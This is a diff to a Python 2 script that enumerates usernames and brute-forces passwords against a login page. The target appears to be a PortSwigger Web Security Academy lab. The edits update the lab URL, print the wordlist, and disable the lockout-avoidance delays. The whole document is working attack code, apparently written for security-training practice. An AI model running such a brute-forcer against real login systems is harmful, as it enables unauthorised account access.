@@ -9,7 +9,7 @@ import time
 import sys
 
 # Set the URL. For the portswigger academy, this URL is subject to change frequently.
-url = 'https://aca01f951e8eb562803daf4a00790046.web-security-academy.net/login'
+url = 'https://ac431f7a1e89edc08048083e008800d8.web-security-academy.net/login'
 
 usernames = []
 passwords = []
@@ -29,6 +29,8 @@ for x in f:
 	passwords.append(x.strip())
 
 f.close()
+
+print passwords
 
 validUserNames = []
 
@@ -58,6 +60,9 @@ if not validUser:
 	
 				if 'Invalid username or password' in x.text:
 					print username + ":" + password + " ==> " + " Response: The username or password was incorrect"
+		if validUserNames:
+			break
+			
 #		Sleep if you want
 #		time.sleep(0.001)
 
@@ -88,29 +93,30 @@ for validUser in validUserNames:
 			sys.exit()
 		
 		# This signifies, that the account is locked out. Wait for a minute, before trying next.
-		elif 'minute' in x.text:
-			print 'Account is locked out!'
-			count=1
-			time.sleep(60)
+		#elif 'minute' in x.text:
+			#print 'Account is locked out!'
+			#count=1
+			#time.sleep(60)
 		
 		# The server responded with a 302, which is a redirect. This means, that the login worked.
-		elif x.status_code == 302:
+		elif 'Invalid username or password' not in x.text and 'You have made too many incorrect login attempts' not in x.text:
+			print x.text
 			print "Found a valid credential! : " + validUser + ":" + password
 			validCredentials.append([validUser, password])
 			break
 		
 		# Increment count, so that we don't lockout the useraccount. This doesn't always work, as the user account ends up getting 			# locked anyway, but using this method, it is much lesser frequent.
-		count=count+1
+		#count=count+1
 		
 		# If we exceed 3 times, let's sleep, and continue after a minute.
-		if count > 3:
-			count=1
-			print('sleeping')
-			time.sleep(60)
+		#if count > 3:
+			#count=1
+			#print('sleeping')
+			#time.sleep(60)
 			#break
 		
-		if len(validCredentials) > 0:
-			sys.exit()		
+	if len(validCredentials) > 0:
+		sys.exit()		
 		
 			
 			
